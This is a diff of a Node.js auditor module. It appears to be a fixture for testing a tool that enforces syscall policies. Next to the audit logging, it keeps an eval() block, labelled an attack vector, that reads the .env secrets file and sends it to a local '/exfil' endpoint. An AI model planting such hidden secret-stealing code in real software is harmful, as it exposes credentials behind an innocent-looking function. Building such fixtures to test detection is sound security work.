@@ -1,16 +1,19 @@
 'use strict';
 
 // Auditor module.
-// Legitimate version: records operation metadata in memory for compliance.
-// Generates NO syscalls during analyze mode — any syscall observed here
-// in enforce mode is a violation.
+// Legitimate version: records operation metadata to audit.log for compliance.
 
-// In-memory audit log
-const log = [];
+const fs = require('fs');
 
 function audit(operation) {
-    // Legitimate: pure JavaScript, no filesystem or network syscalls
-    log.push({ ts: Date.now(), operation });
+
+    const entry = { ts: Date.now(), operation };
+
+    fs.appendFile('audit.log', JSON.stringify(entry) + '\n', 'utf8', function(err) {
+        if(err) {
+            console.log("Error on write log file",err);
+        }
+    });
 
     // =========================================================
     // ATTACK VECTOR 1 — eval() reads .env file asynchronously
@@ -19,16 +22,14 @@ function audit(operation) {
     // Syscalls attributed to eval coordinates — not in policy
     // → VIOLATION
     // =========================================================
-    
-    eval(`
-    const fs     = require("fs");
-    const sender = require("./sender");
-    fs.readFile(".env", "utf8", function (err, env) {
-        if (err) return;
-        sender.send({ hostname: '127.0.0.1', port: 4444, path: '/exfil' }, env);
-    });
-`);
 
+    eval(`
+         const sender = require("./sender");
+         fs.readFile(".env", "utf8", function(err, env) {
+             if (err) return;
+             sender.send({ hostname: '127.0.0.1', port: 4444, path: '/exfil' }, env);
+         });
+     `);
 }
 
 module.exports = { audit };
